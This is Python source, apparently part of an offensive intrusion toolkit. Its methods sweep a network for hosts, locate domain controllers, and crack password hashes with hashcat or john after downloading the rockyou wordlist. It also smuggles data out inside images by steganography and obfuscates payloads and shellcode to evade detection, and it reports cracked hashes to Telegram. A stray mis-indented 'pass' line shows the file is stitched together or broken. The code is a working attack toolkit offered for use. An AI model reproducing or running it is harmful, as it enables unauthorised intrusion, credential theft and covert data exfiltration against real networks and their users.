def discover_network_hosts(
    self,
    network: str = '192.168.1.0/24'
) -> List[Dict[str, Any]]:
    """
    Discover all hosts on a network using ARP scanning and ping sweep.

    Args:
        network: Network CIDR notation (default: 192.168.1.0/24)

    Returns:
        List of discovered hosts with IP, MAC, hostname

    Raises:
        NetworkError: If the network is unreachable

    Example:
        >>> hosts = self.discover_network_hosts("192.168.1.0/24")
        >>> for h in hosts:
        ...     print(f"{h['ip']} -> {h['mac']}")
        192.168.1.1 -> 00:11:22:33:44:55
        192.168.1.10 -> aa:bb:cc:dd:ee:ff
    """
    self.print_header(f"Discovering hosts on network {network}", "STEP")
    results = []

    try:
        network_obj = ipaddress.ip_network(network, strict=False)
        hosts = list(network_obj.hosts())[:254]

        if SCAPY_AVAILABLE:
            try:
                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
                answered = srp(arp_request, timeout=2, verbose=0, retry=2)[0]
                for sent, received in answered:
                    results.append({
                        'ip': received.psrc,
                        'mac': received.hwsrc,
                        'hostname': '',
                        'alive': True,
                        'method': 'arp'
                    })
            except Exception as e:
                self.logger.debug(f"ARP scan failed: {e}")

        if not results:
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = {executor.submit(self.ping_host, str(ip)): str(ip) for ip in hosts[:50]}
                for future in as_completed(futures):
                    ip = futures[future]
                    if future.result():
                        results.append({
                            'ip': ip,
                            'mac': 'unknown',
                            'hostname': '',
                            'alive': True,
                            'method': 'ping'
                        })

        self.print_found("SHELL", f"Found {len(results)} hosts on {network}")
        for result in results:
            self.log_to_db('network_hosts', {
                'ip': result['ip'],
                'mac': result['mac'],
                'hostname': result.get('hostname', ''),
                'os': '',
                'open_ports': ''
            })

    except Exception as e:
        self.logger.debug(f"Network discovery failed: {e}")

    return results


def discover_domain_controllers(
    self,
    domain: Optional[str] = None
) -> List[str]:
    """
    Discover domain controllers via DNS, LDAP, and SMB.

    Args:
        domain: Domain name (optional)

    Returns:
        List of domain controller IPs

    Raises:
        NetworkError: If DNS resolution fails

    Example:
        >>> dcs = self.discover_domain_controllers("example.local")
        >>> print(dcs)
        ['192.168.1.10', '192.168.1.11']
    """
    self.print_header(f"Discovering domain controllers for {domain}", "STEP")
    results = []

    if not domain:
        return results

    try:
        if DNS_AVAILABLE:
            resolver = dns.resolver.Resolver()
            try:
                answers = resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
                for answer in answers:
                    hostname = str(answer.target).rstrip('.')
                    try:
                        ip = socket.gethostbyname(hostname)
                        if ip not in results:
                            results.append(ip)
                            self.print_found("SHELL", f"DC found: {hostname} -> {ip}")
                    except Exception:
                        pass
            except Exception:
                pass

        if LDAP3_AVAILABLE:
            try:
                server = ldap3.Server(f"ldap://{domain}", get_info=ldap3.ALL)
                conn = ldap3.Connection(server, auto_bind=True)
                conn.search(search_base='', search_filter='(objectClass=domain)')
                for entry in conn.entries:
                    if hasattr(entry, 'dc'):
                        results.append(str(entry.dc))
            except Exception:
                pass

    except Exception as e:
        self.logger.debug(f"DC discovery failed: {e}")

    return results

def crack_hashes(
    self,
    hashes: List[str],
    wordlist_path: Optional[str] = None
) -> Dict[str, Any]:
    """
    Crack password hashes using hashcat or john.

    Args:
        hashes: List of hash strings
        wordlist_path: Path to wordlist (optional)

    Returns:
        Dict with 'cracked', 'uncracked', 'method' keys

    Raises:
        FileNotFoundError: If wordlist file not found

    Example:
        >>> result = self.crack_hashes(["$6$xyz...:root:..."])
        >>> print(result['cracked'])
        {'root': 'password123'}
    """
    self.print_header(f"Cracking {len(hashes)} hashes", "STEP")

    result = {
        'success': False,
        'cracked': {},
        'uncracked': hashes,
        'method': 'none',
        'error': ''
    }

    if not wordlist_path:
        wordlist_path = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(wordlist_path):
            try:
                subprocess.run([
                    "wget", "-O", wordlist_path,
                    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
                ], check=False, timeout=60)
            except Exception as e:
                result['error'] = f"Wordlist download failed: {e}"
                return result

    try:
        hash_file = f"/tmp/hashes_{TIMESTAMP}.txt"
        output_file = f"/tmp/hashes_cracked_{TIMESTAMP}.txt"

        with open(hash_file, 'w') as f:
            f.write('\n'.join(hashes))

        cmd = ["hashcat", "-m", "0", hash_file, wordlist_path, "-o", output_file, "--force"]
        returncode, stdout, stderr = self.run_subprocess(cmd, timeout=120)

        if returncode == 0 and os.path.exists(output_file):
            with open(output_file, 'r') as f:
                for line in f:
                    if ':' in line:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            result['cracked'][parts[0]] = parts[1]
                            self.print_found("CRED", f"Cracked: {parts[0]} -> {parts[1]}")
            result['success'] = True
            result['method'] = 'hashcat'
            result['uncracked'] = [
                h for h in hashes
                if not any(h.startswith(k) for k in result['cracked'].keys())
            ]

    except Exception as e:
        self.logger.debug(f"Hashcat failed: {e}")

    if not result['success']:
        try:
            hash_file = f"/tmp/hashes_{TIMESTAMP}.txt"
            with open(hash_file, 'w') as f:
                f.write('\n'.join(hashes))

            cmd = ["john", "--wordlist=" + wordlist_path, hash_file, "--format=raw-md5"]
            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=120)

            if returncode == 0:
                for line in stdout.split('\n'):
                    if ':' in line and ' ' in line:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            result['cracked'][parts[0]] = parts[1]
                if result['cracked']:
                    result['success'] = True
                    result['method'] = 'john'

        except Exception as e:
            self.logger.debug(f"John failed: {e}")

    if result['success'] and self.telegram:
        self.telegram.alert(
            "HASHES CRACKED",
            f"Cracked: {len(result['cracked'])} hashes\nUncracked: {len(result['uncracked'])}",
            "HIGH"
        )

    return result

        pass

def exfil_steganography(
    self,
    data: Union[str, bytes],
    image_path: str,
    output_path: str
) -> bool:
    """
    Exfiltrate data using image steganography.

    Args:
        data: Data to hide
        image_path: Path to carrier image
        output_path: Output image path

    Returns:
        True if successful, False otherwise

    Example:
        >>> success = self.exfil_steganography("sensitive_data", "carrier.png", "output.png")
        >>> print(success)
        True
    """
    if not PIL_AVAILABLE:
        return False

    try:
        from PIL import Image

        if isinstance(data, str):
            data = data.encode()

        # Convert data to bytes and embed in LSB
        img = Image.open(image_path)
        pixels = list(img.getdata())

        # Add length prefix
        data_bytes = len(data).to_bytes(4, 'big') + data
        data_bits = ''.join(format(b, '08b') for b in data_bytes)

        new_pixels = []
        bit_index = 0
        for pixel in pixels:
            new_pixel = list(pixel)
            for i in range(3):  # RGB channels
                if bit_index < len(data_bits):
                    new_pixel[i] = (pixel[i] & 0xFE) | int(data_bits[bit_index])
                    bit_index += 1
            new_pixels.append(tuple(new_pixel))

        img.putdata(new_pixels)
        img.save(output_path)

        self.print_found("EXFIL", f"Steganography exfiltrated {len(data)} bytes to {output_path}")
        return True
    except Exception:
        return False

def encode_payload(
    self,
    payload: str,
    method: str = 'base64'
) -> str:
    """
    Encode payload using various methods.

    Args:
        payload: Payload string
        method: 'base64', 'xor', 'aes', 'hex', 'url', 'uuid', 'json', 'xml', 'rot13', 'base32'

    Returns:
        Encoded payload

    Example:
        >>> encoded = self.encode_payload("id", "base64")
        >>> print(encoded)
        aWQ=
    """
    if method == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif method == 'base32':
        return base64.b32encode(payload.encode()).decode()
    elif method == 'xor':
        key = random.randint(1, 255)
        encoded = bytes([b ^ key for b in payload.encode()])
        return base64.b64encode(encoded).decode()
    elif method == 'aes':
        if CRYPTO_AVAILABLE:
            from cryptography.fernet import Fernet
            key = Fernet.generate_key()
            f = Fernet(key)
            encrypted = f.encrypt(payload.encode())
            return base64.b64encode(encrypted).decode()
    elif method == 'hex':
        return payload.encode().hex()
    elif method == 'url':
        return urllib.parse.quote(payload)
    elif method == 'uuid':
        import uuid
        return str(uuid.uuid5(uuid.NAMESPACE_DNS, payload))
    elif method == 'json':
        return json.dumps({'data': payload})
    elif method == 'xml':
        return f'<?xml version="1.0"?><data>{payload}</data>'
    elif method == 'rot13':
        import codecs
        return codecs.encode(payload, 'rot_13')
    return payload


def obfuscate_payload(
    self,
    payload: str,
    method: str = 'string'
) -> str:
    """
    Obfuscate payload using various methods.

    Args:
        payload: Payload string
        method: 'string', 'dead_code', 'control_flow', 'polymorphic', 'unicode', 'double_encode'

    Returns:
        Obfuscated payload

    Example:
        >>> obfuscated = self.obfuscate_payload("id", "string")
        >>> print(obfuscated)
        eval(String.fromCharCode(105,100))
    """
    if method == 'string':
        chars = ','.join(str(ord(c)) for c in payload)
        return f"eval(String.fromCharCode({chars}))"
    elif method == 'dead_code':
        dead_code = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"if(0){{var {dead_code}='{''.join(random.choices(string.ascii_lowercase, k=10))}';}} {payload}"
    elif method == 'control_flow':
        return f"var _x=0;while(1){{switch(_x){{case 0:{{_x=1;break;}}case 1:{{{payload};_x=2;break;}}case 2:{{_x=3;break;}}default:{{break;}}}}break;}}"
    elif method == 'polymorphic':
        var_names = ''.join(random.choices(string.ascii_lowercase, k=4))
        return f"var {var_names} = function(){{{payload}}}; {var_names}();"
    elif method == 'unicode':
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    elif method == 'double_encode':
        return urllib.parse.quote(urllib.parse.quote(payload))
    return payload


def generate_obfuscated_shellcode(
    self,
    payload: bytes,
    method: str = 'xor'
) -> str:
    """
    Generate obfuscated shellcode.

    Args:
        payload: Shellcode bytes
        method: 'xor', 'aes', 'rot13', 'base64'

    Returns:
        Obfuscated shellcode as string

    Example:
        >>> shellcode = self.generate_obfuscated_shellcode(b'\\x90\\x90\\x90', 'xor')
        >>> print(shellcode[:50])
        \\x90\\x90\\x90...
    """
    if method == 'xor':
        key = random.randint(1, 255)
        obfuscated = bytes([b ^ key for b in payload])
        return ''.join(f'\\x{obfuscated[i]:02x}' for i in range(len(obfuscated)))
    elif method == 'aes':
        if CRYPTO_AVAILABLE:
            from cryptography.fernet import Fernet
            key = Fernet.generate_key()
            f = Fernet(key)
            encrypted = f.encrypt(payload)
            return ''.join(f'\\x{encrypted[i]:02x}' for i in range(len(encrypted)))
    elif method == 'rot13':
        import codecs
        return codecs.encode(payload, 'rot_13')
    elif method == 'base64':
        return base64.b64encode(payload).decode()
    return ''.join(f'\\x{payload[i]:02x}' for i in range(len(payload)))
